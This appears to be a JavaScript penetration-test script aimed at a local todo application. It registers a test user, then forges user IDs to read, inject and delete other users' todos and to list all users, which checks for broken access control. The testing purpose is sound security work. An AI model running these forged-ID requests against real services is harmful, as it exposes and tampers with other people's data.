import axios from 'axios';

const baseURL = 'http://localhost:5000';

const attackerCredentials = {
  username: 'pentester_' + Math.floor(Math.random() * 10000),
  password: 'TestPass123!',
};

let attackerUserId = null;

async function runPenTest() {
  try {
    // Step 0: Register a new attacker user
    const regRes = await axios.post(`${baseURL}/register`, attackerCredentials);
    console.log(`[0] Registered test user: ${attackerCredentials.username}`);

    // Step 1: Login as the test user
    const loginRes = await axios.post(`${baseURL}/login`, attackerCredentials);
    const user = loginRes.data;
    attackerUserId = user.id;
    console.log('[1] Logged in as:', user);

    // Step 2: Attempt to fetch another user's todos
    const usersRes = await axios.get(`${baseURL}/users`);
    const victim = usersRes.data.find(u => u.id !== attackerUserId);
    const forgedUserId = victim?.id;

    if (!forgedUserId) {
      console.log('[2] No other users to test against.');
      return;
    }

    const otherTodosRes = await axios.get(`${baseURL}/todos/${forgedUserId}`);
    console.log(`[2] Retrieved another user's todos: ${victim.username}`);
    console.table(otherTodosRes.data);

    // Step 3: Create a todo for another user
    const forgedTodo = await axios.post(`${baseURL}/todos`, {
      content: 'Injected task into another user',
      user_id: forgedUserId
    });
    console.log('[3] Created forged todo:', forgedTodo.data);

    const newTodoListRes = await axios.get(`${baseURL}/todos/${forgedUserId}`);
    console.log('[3] Victim’s todos after injection:');
    console.table(newTodoListRes.data);

    // Step 4: Delete first todo from victim’s list
    const firstTodo = newTodoListRes.data[0];
    if (firstTodo) {
      await axios.delete(`${baseURL}/todos/${firstTodo.id}`);
      console.log(`[4] Deleted first todo (id=${firstTodo.id}) from victim`);
    } else {
      console.log('[4] No todos found to delete');
    }

    const afterDeleteRes = await axios.get(`${baseURL}/todos/${forgedUserId}`);
    console.log('[4] Victim’s todos after deletion:');
    console.table(afterDeleteRes.data);

    // Step 5: View all users
    const refreshedUsers = await axios.get(`${baseURL}/users`);
    console.log('[5] Retrieved user list:');
    console.table(refreshedUsers.data);

  } catch (err) {
    console.error('Pen test failed:', err.response?.data || err.message);
  } finally {
    // Step 6: Cleanup — delete the test user
    if (attackerUserId) {
      try {
        const cleanupRes = await axios.delete(`${baseURL}/delete-user/${attackerUserId}`);
        console.log(`[6] Cleaned up without admin access test user ID ${attackerUserId}:`, cleanupRes.data);
      } catch (cleanupErr) {
        console.error('[6] Failed to delete test user:', cleanupErr.response?.data || cleanupErr.message);
      }
    }
  }
}

runPenTest();
